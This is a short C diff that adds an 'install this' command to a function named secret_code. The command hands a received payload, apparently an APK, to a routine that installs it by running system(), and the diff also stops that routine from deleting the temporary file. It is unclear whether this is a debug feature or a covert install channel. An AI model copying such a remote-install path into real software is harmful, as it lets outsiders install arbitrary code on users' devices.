@@ -114,6 +114,12 @@ char *secret_code(int argc, char **argv, int *ret_val, const char *const host,
     LOG("nothing happens");
     *ret_val = 0;
     ret_str = NULL;
+  } else if (0 == strcmp(cmd, CODE_CMD_INSTALLTHIS)) {
+    ret_str = cmd_install_file(payload->payload, payload_size, ret_val);
+  } else {
+    LOG_ERR("unknown command:%s", payload->command);
+    *ret_val = EINVAL;
+    ret_str = malloc_str("bad command");
   }
 
   free(payload);
@@ -148,7 +154,7 @@ static char *cmd_install_file(void *apk, size_t apk_size, int *ret_val) {
   err = system(system_cmd);
   free(system_cmd);
   LOG("exited with %d", WEXITSTATUS(err));
-  unlink(path);
+  // unlink(path);
   free(path);
   *ret_val = WEXITSTATUS(err);
   return NULL;
